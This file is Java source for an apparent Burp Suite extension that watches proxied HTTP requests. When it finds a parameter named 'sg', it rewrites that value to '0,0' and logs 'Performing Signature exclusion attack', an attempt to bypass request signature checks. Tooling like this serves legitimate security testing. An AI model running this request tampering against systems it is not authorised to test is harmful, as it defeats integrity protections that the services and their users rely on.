package burp;
import java.io.PrintWriter;
import java.net.URL;
import java.util.List;
import java.io.*;
import java.util.*;
import java.lang.*;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;
/**
 * Class to capture request to read the content of the request to identify the type of attack that can be
 * immplemented
 */
public class ReadMessage implements  IHttpListener,IProxyListener {

    private final IExtensionHelpers helpers;
    private static PrintWriter stdout;
    private int diff = 0;

    public ReadMessage(IBurpExtenderCallbacks callbacks) {
        this.helpers = callbacks.getHelpers();
        // obtain our output
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
    }


    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo){

        if(messageIsRequest){
            IHttpService httpService = messageInfo.getHttpService();

            IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);
            String request = new String(messageInfo.getRequest());
            String messageBody = request.substring(requestInfo.getBodyOffset());
            for (IParameter param : requestInfo.getParameters()) {
                // parameter with empty signature
                if(param.getName().matches("sg")){
                    messageInfo.setComment("Signature excl possible");
                    messageInfo.setHighlight("red");
//                    emptyArray = helpers.addParameter(emptyArray,tmpParameter);
//                 test = helpers.updateParameter(test, tmpParameter);
                    //messageInfo.setRequest(updateMessage);

                }
            }
        }
    }


    @Override
    public void processProxyMessage(boolean messageIsRequest, IInterceptedProxyMessage message){
        boolean flag = false;
        if(messageIsRequest){
            IHttpRequestResponse messageInfo = message.getMessageInfo();

            IRequestInfo rqInfo = helpers.analyzeRequest(messageInfo);
            List headers = rqInfo.getHeaders();
            headers.add("Test: BurpExHeader");
            String request = new String(messageInfo.getRequest());
            String messageBody = request.substring(rqInfo.getBodyOffset());
            for (IParameter param : rqInfo.getParameters()) {
                // parameter with empty signature
                if (param.getName().matches("sg")) {
                    flag = true;
                }
            }
            if(flag) {
                Matcher m = Pattern.compile("(?=(sg))").matcher(messageBody);
                List<Integer> pos = new ArrayList<Integer>();
                while (m.find()) {
                    pos.add(m.start());
                }
                for(int n:pos) {
                    messageBody = modifyString(messageBody, n-diff);
                }
                stdout.println("Performing Signature exclusion attack");
                stdout.println(rqInfo.getUrl());
                byte[] updateMessage = helpers.buildHttpMessage(headers, messageBody.getBytes());
                messageInfo.setRequest(updateMessage);
                stdout.println(messageInfo.getResponse());
            }

        }
        else {
            stdout.println("");
        }
    }

    public String modifyString(String msgStr, int indexStart){
        String values = "0,0";
        String tempStr = msgStr.substring(0,indexStart+5);
        String truncatedStr = msgStr.substring(indexStart+6);
        int y = truncatedStr.indexOf("]");
        String remainStr = truncatedStr.substring(y);
        tempStr = tempStr.concat(values).concat(remainStr);
        diff = msgStr.length() - tempStr.length();
        return tempStr;
    }

}